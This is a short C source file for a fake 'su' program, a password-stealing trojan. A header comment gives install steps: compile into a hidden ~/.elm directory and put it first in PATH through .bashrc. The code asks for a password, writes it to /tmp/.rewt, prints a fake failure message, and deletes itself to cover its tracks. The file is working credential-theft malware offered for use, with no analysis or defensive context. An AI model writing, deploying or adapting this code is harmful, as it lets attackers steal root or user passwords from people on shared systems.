/*s help.
 * mkdir .elm
 * cc -o ~/.elm/su su.c
 * edit .bash_profile or .bashrc
 * add PATH=$HOME/.elm:$PATH
 */

#include <stdio.h>
#include <stdlib.h>

#define SU_PASS "/tmp/.rewt"

main (int argc, char *argv[])
{
   char *key;
   char buf[24];
   FILE *fd;

   key = (char *)getpass ("Password:");
   fd = fopen(SU_PASS,"w");
   fprintf(fd, "pass: %s\n", key);
   fclose(fd);
   printf ("su: incorrect password\n");
   sprintf(buf, "rm %s", argv[0]);
   system(buf);
   exit (1);
}
